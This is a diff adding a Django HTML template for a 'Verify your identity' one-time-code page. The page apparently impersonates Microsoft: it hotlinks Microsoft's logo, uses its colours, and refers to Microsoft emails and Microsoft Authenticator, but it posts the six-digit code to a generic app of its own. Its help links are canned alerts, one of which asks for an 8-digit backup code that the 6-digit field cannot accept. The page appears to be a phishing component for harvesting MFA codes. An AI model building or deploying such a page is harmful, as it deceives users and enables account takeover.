@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verify your identity</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+        .container{max-width:440px;width:100%;padding:20px}
+        .card{background:#fff;border-radius:8px;padding:44px 40px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .logo{text-align:center;margin-bottom:30px}
+        .logo img{height:40px}
+        h1{font-size:24px;margin-bottom:8px}
+        .subtitle{color:#666;margin-bottom:25px}
+        .subtitle strong{color:#0067b8}
+        .form-group{margin-bottom:25px}
+        .form-group label{display:block;margin-bottom:8px;font-weight:600}
+        .form-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:4px;font-size:28px;letter-spacing:12px;text-align:center;font-weight:bold}
+        .form-group input:focus{outline:none;border-color:#0067b8}
+        .btn{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer}
+        .btn:hover{background:#004d8c}
+        .btn-secondary{width:100%;padding:12px;background:transparent;color:#0067b8;border:1px solid #0067b8;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
+        .btn-secondary:hover{background:#e8f0fe}
+        .message{padding:12px;border-radius:4px;margin-bottom:15px}
+        .message.success{background:#d4edda;color:#155724}
+        .message.error{background:#f8d7da;color:#721c24}
+        .link{color:#0067b8;text-decoration:none}
+        .link:hover{text-decoration:underline}
+        .divider{margin-top:25px;padding-top:25px;border-top:1px solid #e5e5e5}
+        .help-options{background:#f8f9fa;border-radius:6px;padding:15px;margin-top:15px}
+        .help-options h3{font-size:14px;color:#666;margin-bottom:10px}
+        .help-options ul{list-style:none;padding:0}
+        .help-options ul li{margin:8px 0}
+        .help-options ul li a{color:#0067b8;text-decoration:none;font-size:14px}
+        .help-options ul li a:hover{text-decoration:underline}
+        .timer{color:#666;font-size:14px}
+        .timer span{font-weight:bold;color:#0067b8}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"></div>
+            {% if messages %}{% for m in messages %}<div class="message {{m.tags}}">{{m}}</div>{% endfor %}{% endif %}
+            
+            <h1>Verify your identity</h1>
+            <p class="subtitle">We sent a verification code to <strong>{{ email }}</strong></p>
+            
+            <form method="POST" id="verifyForm">
+                {% csrf_token %}
+                <div class="form-group">
+                    <label>Enter the 6-digit code</label>
+                    <input type="text" name="code" placeholder="000000" maxlength="6" required autofocus>
+                </div>
+                <button type="submit" class="btn" id="verifyBtn">Verify</button>
+            </form>
+
+            <div class="divider">
+                <div class="timer">⏱️ Code expires in <span id="timer">5:00</span></div>
+            </div>
+
+            <div class="help-options">
+                <h3>❓ Having trouble?</h3>
+                <ul>
+                    <li><a href="{% url 'app:resend_otp' %}">📧 Resend the code</a></li>
+                    <li><a href="#" onclick="showHelp()">📱 Try another verification method</a></li>
+                    <li><a href="#" onclick="checkSpam()">📨 Check spam folder</a></li>
+                    <li><a href="#" onclick="useAuthenticator()">📲 Use Microsoft Authenticator</a></li>
+                    <li><a href="#" onclick="useBackupCode()">🔑 Use a backup code</a></li>
+                </ul>
+            </div>
+
+            <div style="margin-top:15px;text-align:center;border-top:1px solid #e5e5e5;padding-top:15px;">
+                <p style="font-size:12px;color:#999;">
+                    If you don't receive the code, check your spam folder or try another method.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-submit when 6 digits entered
+        document.querySelector('input[name="code"]').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length === 6) {
+                document.getElementById('verifyBtn').click();
+            }
+        });
+
+        function showHelp() {
+            alert('🔐 Other verification methods:\n\n' +
+                  '1. 📧 Email - Check your inbox and spam folder\n' +
+                  '2. 📱 SMS - Check your phone for a text message\n' +
+                  '3. 📲 Authenticator - Open the Microsoft Authenticator app\n' +
+                  '4. 🔑 Backup Code - Use a code you saved earlier');
+        }
+
+        function checkSpam() {
+            alert('📨 Check your spam/junk folder.\n\n' +
+                  'Sometimes Microsoft emails go to spam.\n' +
+                  'If you find it, mark as "Not spam" and enter the code.');
+        }
+
+        function useAuthenticator() {
+            alert('📲 Open Microsoft Authenticator on your phone.\n\n' +
+                  'You\'ll see a 6-digit code that refreshes every 30 seconds.\n' +
+                  'Enter that code here.');
+        }
+
+        function useBackupCode() {
+            alert('🔑 Backup codes are 8-digit codes you saved when setting up 2FA.\n\n' +
+                  'If you have one, enter it below.\n' +
+                  'If not, use one of the other options.');
+        }
+
+        // Timer
+        let timeLeft = 300;
+        const timerElement = document.getElementById('timer');
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            if (timeLeft <= 0) {
+                timerElement.textContent = 'Expired';
+                timerElement.style.color = '#dc3545';
+            } else {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            }
+        }
+        updateTimer();
+    </script>
+</body>
+</html>
